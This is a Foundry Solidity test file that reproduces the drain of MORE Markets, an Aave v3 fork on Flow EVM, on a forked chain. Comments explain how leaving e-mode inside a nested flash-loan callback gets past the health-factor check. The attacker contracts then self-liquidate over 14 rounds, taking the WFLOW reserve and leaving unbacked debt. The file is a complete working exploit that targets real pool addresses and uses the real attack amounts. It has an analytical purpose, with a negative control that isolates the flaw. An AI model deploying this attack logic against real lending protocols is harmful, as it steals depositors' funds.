// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~308K USD (headline estimate; measured on-chain drain reproduced below)
// Attacker EOA     : https://evm.flowscan.io/address/0xe1eA6F2365215389f9DCd50a51c974313BF6785C
// Attacker orchestrator (clone factory) : 0x9a8cC604b3534eAA1A8627c1D6f6084857Bf2765
// Attacker position clone (EIP-1167)     : 0xf96483918e287d7f235aeda1bc67df07384c4896
// Victim pool (MORE Markets, Aave v3 fork) : 0xbC92aaC2DBBF42215248B5688eB3D3d2b32F2c8d
// Victim WFLOW reserve aToken              : 0x02BF4bd075c1b7C8D85F54777eaAA3638135c059
// Example exploit tx (one of several)      : https://evm.flowscan.io/tx/0xdf9e3ed4858103569f684166d9833e1980b6ba96334c9a8ec172b4e2aa1d15d8
//
// @Summary
// MORE Markets is an Aave v3 fork on Flow EVM. ankrFLOW (Ankr staked FLOW) and WFLOW sit in the
// same correlated e-mode category (id 1), which carries an LTV of 97% and a liquidation threshold
// of 97.5%. Outside e-mode, ankrFLOW carries an 81% liquidation threshold and a 6% liquidation
// bonus.
//
// Aave validates setUserEMode by requiring the caller's health factor to stay >= 1 after the
// category change. The attacker evades that guard by dropping out of e-mode inside a nested flash
// loan callback, at the one instant where the position has collateral supplied but no borrow debt
// registered yet: both the outer ankrFLOW flash loan (mode 1) and the inner WFLOW flash loan
// (mode 2) only open their debt positions after their respective executeOperation callbacks return.
// So setUserEMode(0) sees a debt-free, infinitely-healthy account and passes, even though the
// position is about to carry a WFLOW borrow sized to the 97% e-mode LTV.
//
// Once the flash loans settle, the account holds 15M ankrFLOW collateral valued under the now-81%
// threshold against a WFLOW debt worth ~97% of the collateral, so its health factor is below 1 by
// construction, with no price movement. The attacker self-liquidates in the same transaction,
// repaying the WFLOW debt and seizing the ankrFLOW collateral plus the 6% liquidation bonus. The
// WFLOW pulled out through the mode-2 flash loan is left behind as unbacked variable debt, and the
// matching WFLOW leaves the reserve. One transaction runs this cycle 14 times, each round sized to
// what the reserve can still hand out.
//
// The borrower path is fully permissionless: a fresh account deploys a position contract and calls
// setUserEMode, flashLoan, supply and liquidationCall, all public Aave v3 entry points. No role,
// whitelist or oracle manipulation is involved. Prices are only read, never moved.
//
// @Reconstruction
// Fork one block before the example transaction (85326750) so the pool, reserves and e-mode config
// are inherited as settled on-chain state. A brand-new EOA deploys a fresh position contract and
// runs the same 14-round cycle with typed Aave v3 calls. The per-round flash-loan amounts are the
// ones the attacker used on-chain (they are valid against this exact reserve state); every argument
// is passed as a typed value, there is no opaque calldata replay, no vm.store / vm.prank of a
// protocol identity and no mocked oracle. The only funds that move are real flash loans from the
// pool. The test asserts the WFLOW drained out of the reserve and the matching unbacked WFLOW debt
// that the cycle leaves behind.

interface IPool {
    function setUserEMode(uint8 categoryId) external;
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
    function liquidationCall(
        address collateralAsset,
        address debtAsset,
        address user,
        uint256 debtToCover,
        bool receiveAToken
    ) external;
    function getUserAccountData(address user)
        external
        view
        returns (
            uint256 totalCollateralBase,
            uint256 totalDebtBase,
            uint256 availableBorrowsBase,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor
        );
}

IPool constant POOL = IPool(0xbC92aaC2DBBF42215248B5688eB3D3d2b32F2c8d);
IERC20 constant ANKRFLOW = IERC20(0x1b97100eA1D7126C4d60027e231EA4CB25314bdb);
IERC20 constant WFLOW = IERC20(0xd3bF53DAC106A0290B0483EcBC89d40FcC961f3e);
uint8 constant EMODE_CORRELATED = 1;

// One disposable position, matching the per-round EIP-1167 clone the orchestrator deployed on-chain
// (14 clones, one per round). It opens a self-underwater e-mode position, self-liquidates, keeps the
// seized collateral and the WFLOW it never repaid, and leaves its unbacked debt behind in the pool.
contract MorePosition {
    uint256 internal _wflowForRound;
    bool internal _dropEMode;
    address internal immutable _owner;

    constructor() {
        _owner = msg.sender;
    }

    // Run the drain cycle for this round, then return all extracted tokens to the orchestrator.
    // dropEMode=false is the negative control: the e-mode exit is skipped, the position stays healthy
    // under the 97.5% e-mode threshold, and the self-liquidation reverts.
    function run(uint256 ankrAmount, uint256 wflowAmount, bool dropEMode) external {
        require(msg.sender == _owner, "only owner");
        _wflowForRound = wflowAmount;
        _dropEMode = dropEMode;

        POOL.setUserEMode(EMODE_CORRELATED);

        address[] memory assets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory modes = new uint256[](1);
        assets[0] = address(ANKRFLOW);
        amounts[0] = ankrAmount;
        modes[0] = 0; // plain flash loan: repaid in full from the seized collateral, leaves no ankrFLOW debt
        POOL.flashLoan(address(this), assets, amounts, modes, address(this), abi.encode(uint256(1)), 0);

        // Hand the proceeds of this round's position back to the orchestrator.
        WFLOW.transfer(_owner, WFLOW.balanceOf(address(this)));
        ANKRFLOW.transfer(_owner, ANKRFLOW.balanceOf(address(this)));
    }

    function executeOperation(
        address[] calldata, /*assets*/
        uint256[] calldata amounts,
        uint256[] calldata, /*premiums*/
        address, /*initiator*/
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == address(POOL), "only pool");
        uint256 stage = abi.decode(params, (uint256));

        if (stage == 1) {
            // Outer ankrFLOW flash loan. Supply the borrowed ankrFLOW as collateral, and leave an
            // allowance so the pool can pull the flash-loan repayment (amount + premium) at the end.
            ANKRFLOW.approve(address(POOL), type(uint256).max);
            POOL.supply(address(ANKRFLOW), amounts[0], address(this), 0);

            // Inner WFLOW flash loan (mode 2): pulls WFLOW from the reserve and opens variable debt.
            address[] memory a = new address[](1);
            uint256[] memory amt = new uint256[](1);
            uint256[] memory m = new uint256[](1);
            a[0] = address(WFLOW);
            amt[0] = _wflowForRound;
            m[0] = 2;
            POOL.flashLoan(address(this), a, amt, m, address(this), abi.encode(uint256(2)), 0);

            // Position now carries a WFLOW debt sized to the 97% e-mode LTV but is being valued at
            // the 81% normal threshold: health factor is below 1. Self-liquidate.
            WFLOW.approve(address(POOL), type(uint256).max);
            POOL.liquidationCall(address(ANKRFLOW), address(WFLOW), address(this), type(uint256).max, false);

            return true;
        } else {
            // Inner WFLOW callback: drop e-mode while no borrow debt is registered yet, so the
            // setUserEMode health-factor guard passes on an account that is about to be underwater.
            if (_dropEMode) {
                POOL.setUserEMode(0);
            }
            return true;
        }
    }
}

// Orchestrator: deploys a fresh position per round (as the on-chain attacker did) and collects loot.
contract MorePositionDrainer {
    // Fund the fresh position with a small ankrFLOW working-capital buffer, run the round, and take
    // back everything it did not consume. The buffer covers the ankrFLOW flash-loan premium and the
    // dust of collateral the liquidation leaves behind as bad-debt backing. On-chain this leg nets to
    // zero through the pool's own ankrFLOW custody and reward routing (the attacker EOA held no
    // ankrFLOW), so this buffer only stands in for that routing. It is immaterial next to the WFLOW
    // drained, and the leftover is returned, so the net ankrFLOW consumed is reported by the test.
    function runRound(uint256 ankrAmount, uint256 wflowAmount, uint256 buffer) external {
        MorePosition position = new MorePosition();
        ANKRFLOW.transfer(address(position), buffer);
        position.run(ankrAmount, wflowAmount, true);
    }

    // Negative control: same cycle but without the e-mode exit. Expected to revert in liquidation.
    function runRoundNoExit(uint256 ankrAmount, uint256 wflowAmount, uint256 buffer) external {
        MorePosition position = new MorePosition();
        ANKRFLOW.transfer(address(position), buffer);
        position.run(ankrAmount, wflowAmount, false);
    }

    function sweep(address token, address to) external {
        IERC20(token).transfer(to, IERC20(token).balanceOf(address(this)));
    }
}

contract MOREDeFi_exp is Test {
    // POOL, ANKRFLOW and WFLOW are declared at file scope above and shared with the attacker contracts.
    address constant WFLOW_RESERVE = 0x02BF4bd075c1b7C8D85F54777eaAA3638135c059; // WFLOW aToken
    address constant VARIABLE_DEBT_WFLOW = 0x8ba0641DBB9Cd2dBEDFCb8f9F179D88289F6b6C0;

    // A real ankrFLOW holder (not the pool reserve) used only to seed the attacker's working-capital
    // buffer. No funds are minted; see MorePositionDrainer.runRound for what the buffer stands in for.
    address constant ANKR_HOLDER = 0xbB577ac54E4641a7e2b38Ce39e794096CD11A639;
    uint256 constant ROUND_BUFFER = 100_000 ether; // ankrFLOW per round; leftover is returned

    uint256 constant FORK_BLOCK = 85326750; // one block before the example exploit tx

    // Per-round flash-loan amounts captured from the on-chain example transaction, in order.
    uint256[14] ANKR_AMT = [
        uint256(15000000000000000000000000),
        15000000000000000000000000,
        14725705507633639025640914,
        14327330523608691053725415,
        13939732790820677563909574,
        13562620751945766364811368,
        13195710737169770476643087,
        12838726750807096386089983,
        12491400263692296746940154,
        12153470011188061073003285,
        11824681796657702745936787,
        11504788300254311143675803,
        11193548892882736977210748,
        10890729455194470012797590
    ];
    uint256[14] WFLOW_AMT = [
        uint256(17805278511233457984911430),
        17805278511233457984911430,
        17479685855854760862545762,
        17006807353023268980329119,
        16546721647515720680712516,
        16099082655375261160244642,
        15663553655265435150983277,
        15239807035182916564375042,
        14827524046022426794587496,
        14426394561808469201426296,
        14036116846413522180621369,
        13656397326587212449000571,
        13286950371125737394115706,
        12927498076015424133181605
    ];

    function setUp() public {
        vm.createSelectFork(vm.envOr("FLOW_RPC", string("flow")), FORK_BLOCK);
    }

    function testExploit() public {
        uint256 reserveBefore = WFLOW.balanceOf(WFLOW_RESERVE);
        uint256 debtBefore = IERC20(VARIABLE_DEBT_WFLOW).totalSupply();

        address attacker = makeAddr("attacker");
        MorePositionDrainer drainer;

        vm.prank(attacker);
        drainer = new MorePositionDrainer();

        // Seed the attacker's ankrFLOW working-capital buffer from a real holder (not minted).
        uint256 totalBuffer = ROUND_BUFFER * 14;
        vm.prank(ANKR_HOLDER);
        ANKRFLOW.transfer(address(drainer), totalBuffer);

        vm.startPrank(attacker);
        for (uint256 i = 0; i < 14; i++) {
            drainer.runRound(ANKR_AMT[i], WFLOW_AMT[i], ROUND_BUFFER);
        }
        drainer.sweep(address(WFLOW), attacker);
        drainer.sweep(address(ANKRFLOW), attacker);
        vm.stopPrank();

        uint256 reserveAfter = WFLOW.balanceOf(WFLOW_RESERVE);
        uint256 debtAfter = IERC20(VARIABLE_DEBT_WFLOW).totalSupply();
        uint256 attackerWflow = WFLOW.balanceOf(attacker);
        uint256 ankrLeft = ANKRFLOW.balanceOf(attacker); // buffer not consumed
        uint256 ankrSpent = totalBuffer > ankrLeft ? totalBuffer - ankrLeft : 0;

        console.log("WFLOW reserve before   :", reserveBefore / 1e18);
        console.log("WFLOW reserve after    :", reserveAfter / 1e18);
        console.log("WFLOW drained          :", (reserveBefore - reserveAfter) / 1e18);
        console.log("unbacked WFLOW debt new:", (debtAfter - debtBefore) / 1e18);
        console.log("attacker WFLOW gain    :", attackerWflow / 1e18);
        console.log("ankrFLOW buffer spent  :", ankrSpent / 1e18);

        // The pool's WFLOW reserve is drained and a matching amount of WFLOW debt is left unbacked.
        assertGt(reserveBefore - reserveAfter, 1_000_000 ether, "WFLOW reserve not drained");
        assertGt(debtAfter - debtBefore, 1_000_000 ether, "no unbacked WFLOW debt created");
        // The attacker walks away with far more WFLOW than the ankrFLOW working capital it consumed.
        assertGt(attackerWflow, 1_000_000 ether, "attacker gained no WFLOW");
    }

    // Negative control: the identical cycle without the e-mode exit leaves the position healthy under
    // the 97.5% e-mode threshold, so the self-liquidation is rejected. This isolates the e-mode exit
    // as the defect: the drain above is only possible because the position is dropped out of e-mode
    // mid-flash-loan.
    function testControl_NoEModeExit_LiquidationReverts() public {
        address attacker = makeAddr("attacker2");

        vm.prank(attacker);
        MorePositionDrainer drainer = new MorePositionDrainer();

        vm.prank(ANKR_HOLDER);
        ANKRFLOW.transfer(address(drainer), ROUND_BUFFER);

        vm.prank(attacker);
        vm.expectRevert(); // liquidationCall rejects a position whose health factor is not below 1
        drainer.runRoundNoExit(ANKR_AMT[0], WFLOW_AMT[0], ROUND_BUFFER);
    }
}
